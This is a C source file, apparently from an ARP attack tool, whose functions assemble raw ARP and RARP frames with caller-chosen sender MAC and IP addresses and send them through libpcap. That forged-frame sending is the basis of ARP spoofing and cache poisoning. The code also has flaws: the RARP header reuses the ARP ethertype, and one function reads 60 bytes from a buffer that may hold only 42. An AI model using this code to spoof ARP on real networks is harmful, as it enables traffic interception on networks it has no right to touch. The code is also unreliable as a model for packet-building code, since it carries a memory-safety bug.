#ifndef _SKYSY_ARPATTACK_ARP_C
#define _SKYSY_ARPATTACK_ARP_C

#include "Arp.h"

uint8_t arpData[9] = {
    0x08,0x06, 
    0x00,0x01, 
    0x08,0x00, 
    0x06, 
    0x04,
    0x00
};

uint8_t rarpData[9] = {
    0x08,0x06, 
    0x00,0x01, 
    0x08,0x00, 
    0x06, 
    0x04,
    0x00
};

void FillRArpData(uint8_t* desMac, uint8_t* desIp, uint8_t* souMac, uint8_t* souIp, uint8_t op, int isBoardcast, uint8_t* data)
{
    uint8_t blankData[18] = {0x00};
    uint8_t boardcastMac[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    if (isBoardcast) {
        memcpy(data, boardcastMac, 6);
    } else {
        memcpy(data, desMac, 6);
    }

    memcpy(data +  6, souMac, 6);
    memcpy(data + 12, rarpData, 9);
    memcpy(data + 21, &op, 1);
    memcpy(data + 22, souMac, 6);
    memcpy(data + 28, souIp, 4);
    memcpy(data + 32, desMac, 6);
    memcpy(data + 38, desIp, 4);

    /* Boardcast fill blank */
    if (isBoardcast) {
        memcpy(data + 42, blankData, 18);
    }
}

void FillArpData(uint8_t* desMac, uint8_t* desIp, uint8_t* souMac, uint8_t* souIp, uint8_t op, int isBoardcast, uint8_t* data)
{
    uint8_t blankData[18] = {0x00};
    uint8_t boardcastMac[8] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    if (isBoardcast) {
        memcpy(data, boardcastMac, 6);
    } else {
        memcpy(data, desMac, 6);
    }

    memcpy(data +  6, souMac, 6);
    memcpy(data + 12, arpData, 9);
    memcpy(data + 21, &op, 1);
    memcpy(data + 22, souMac, 6);
    memcpy(data + 28, souIp, 4);
    memcpy(data + 32, desMac, 6);
    memcpy(data + 38, desIp, 4);

    /* Boardcast fill blank */
    if (isBoardcast) {
        memcpy(data + 42, blankData, 18);
    }
}

int SendRArpData(pcap_t* adhandle, uint8_t* desMac, uint8_t* desIp, uint8_t* souMac, uint8_t*  souIp, uint8_t op, int isBoardcast)
{
    uint8_t* _rarpData;
    int dataLen;

    if (isBoardcast) {
        dataLen = 60;
    } else {
        dataLen = 42;
    }
    _rarpData = (uint8_t*) malloc(sizeof(uint8_t) * dataLen);

    FillRArpData(desMac, desIp, souMac, souIp, op, isBoardcast, _rarpData);

   
    for(int i = 0 ; i < 60; i++) {
        printf("%.2x ", _rarpData[i]);
    }
    printf("\n");
    

    printf("%d\n", pcap_sendpacket(adhandle, _rarpData, dataLen));
    free(_rarpData);
    return 1;
}

int SendArpData(pcap_t* adhandle, uint8_t* desMac, uint8_t* desIp, uint8_t* souMac, uint8_t*  souIp, uint8_t op, int isBoardcast)
{
    uint8_t* _arpData;
    int dataLen;

    if (isBoardcast) {
        dataLen = 60;
    } else {
        dataLen = 42;
    }
    _arpData = (uint8_t*) malloc(sizeof(uint8_t) * dataLen);

    /* 填充ARP数据 */
    FillArpData(desMac, desIp, souMac, souIp, op, isBoardcast, _arpData);

   /*
    for(int i = 0 ; i < 60; i++) {
        printf("%.2x ", _arpData[i]);
    }
    printf("\n");
    */

    pcap_sendpacket(adhandle, _arpData, dataLen);
    free(_arpData);
    return 1;
}

#endif